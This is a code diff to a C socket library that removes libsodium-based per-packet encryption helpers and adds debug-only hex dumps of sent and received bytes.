@@ -47,10 +47,7 @@ void laikaS_initSocket(struct sLaika_socket *sock) {
     sock->outBuf = NULL;
     sock->outCap = ARRAY_START;
     sock->outCount = 0;
-    sock->inStart = -1;
-    sock->outStart = -1;
     sock->flipEndian = false;
-    sock->useSecure = false;
 
     laikaS_init();
 }
@@ -175,82 +172,6 @@ bool laikaS_setNonBlock(struct sLaika_socket *sock) {
     return true;
 }
 
-void laikaS_startOutPacket(struct sLaika_socket *sock, uint8_t id) {
-    if (sock->outStart != -1) { /* sanity check */
-        LAIKA_ERROR("unended OUT packet!\n")
-    }
-    laikaS_writeByte(sock, id);
-
-    sock->outStart = sock->outCount;
-    if (sock->useSecure) { /* if we're encrypting this packet, append the nonce right after the packet ID */
-        uint8_t nonce[crypto_secretbox_NONCEBYTES];
-        randombytes_buf(nonce, crypto_secretbox_NONCEBYTES);
-        laikaS_write(sock, nonce, crypto_secretbox_NONCEBYTES);
-    }
-}
-
-int laikaS_endOutPacket(struct sLaika_socket *sock) {
-    uint8_t *body;
-    size_t sz;
-
-    if (sock->useSecure) {
-        /* make sure we have enough space */
-        laikaM_growarray(uint8_t, sock->outBuf, crypto_secretbox_MACBYTES, sock->outCount, sock->outCap);
-
-        /* packet body starts after the id & nonce */
-        body = &sock->outBuf[sock->outStart + crypto_secretbox_NONCEBYTES];
-        /* encrypt packet body in-place */
-        if (crypto_secretbox_easy(body, body, (sock->outCount - sock->outStart) - crypto_secretbox_NONCEBYTES,
-                &sock->outBuf[sock->outStart], sock->outKey) != 0) {
-            LAIKA_ERROR("Failed to encrypt packet!\n")
-        }
-
-        sock->outCount += crypto_secretbox_MACBYTES;
-    }
-
-    sz = sock->outCount - sock->outStart;
-    sock->outStart = -1;
-    return sz;
-}
-
-void laikaS_startInPacket(struct sLaika_socket *sock) {
-    if (sock->inStart != -1) { /* sanity check */
-        LAIKA_ERROR("unended IN packet!\n")
-    }
-
-    sock->inStart = sock->inCount;
-}
-
-int laikaS_endInPacket(struct sLaika_socket *sock) {
-    uint8_t *body;
-    size_t sz = sock->inCount - sock->inStart;
-
-    if (sock->useSecure) {
-        body = &sock->inBuf[sock->inStart + crypto_secretbox_NONCEBYTES];
-
-        /* decrypt packet body in-place */
-        if (crypto_secretbox_open_easy(body, body, (sock->inCount - sock->inStart) - crypto_secretbox_NONCEBYTES,
-                &sock->inBuf[sock->inStart], sock->inKey) != 0) {
-            LAIKA_ERROR("Failed to decrypt packet!\n")
-        }
-
-        /* decrypted message is smaller now */
-        sock->inCount -= crypto_secretbox_MACBYTES;
-
-        /* remove nonce */
-        laikaM_rmvarray(sock->inBuf, sock->inCount, sock->inStart, crypto_secretbox_NONCEBYTES);
-
-        sz -= crypto_secretbox_MACBYTES + crypto_secretbox_NONCEBYTES;
-    }
-
-    sock->inStart = -1;
-    return sz;
-}
-
-void laikaS_setSecure(struct sLaika_socket *sock, bool flag) {
-    sock->useSecure = flag;
-}
-
 void laikaS_read(struct sLaika_socket *sock, void *buf, size_t sz) {
     memcpy(buf, sock->inBuf, sz);
     laikaM_rmvarray(sock->inBuf, sock->inCount, 0, sz);
@@ -348,10 +269,24 @@ RAWSOCKCODE laikaS_rawRecv(struct sLaika_socket *sock, size_t sz, int *processed
         /* if the socket closed or an error occurred, return the error result */
         errCode = RAWSOCK_ERROR;
     } else if (rcvd > 0) {
+#ifdef DEBUG
+        /* for debugging */
+        int i;
+        printf("---recv'd %d bytes---\n", rcvd);
+        for (i = 1; i <= rcvd; i++) {
+            printf("%.2x ", sock->inBuf[sock->inCount + (i-1)]);
+            if (i % 16 == 0) {
+                printf("\n");
+            } else if (i % 8 == 0) {
+                printf("\t");
+            }
+        }
+        printf("\n");
+#endif
+
         /* recv() worked, add rcvd to inCount */
         sock->inCount += rcvd;
     }
-
     *processed = rcvd;
     return errCode;
 }
@@ -389,6 +324,21 @@ RAWSOCKCODE laikaS_rawSend(struct sLaika_socket *sock, size_t sz, int *processed
     } while((sentBytes += sent) < sz);
 
 _rawWriteExit:
+#ifdef DEBUG
+    /* for debugging */
+    int i;
+    printf("---sent %d bytes---\n", sent);
+    for (i = 1; i <= sentBytes; i++) {
+        printf("%.2x ", sock->outBuf[i-1]);
+        if (i % 16 == 0) {
+            printf("\n");
+        } else if (i % 8 == 0) {
+            printf("\t");
+        }
+    }
+    printf("\n");
+#endif
+
     /* trim sent data from outBuf */
     laikaM_rmvarray(sock->outBuf, sock->outCount, 0, sentBytes);
 
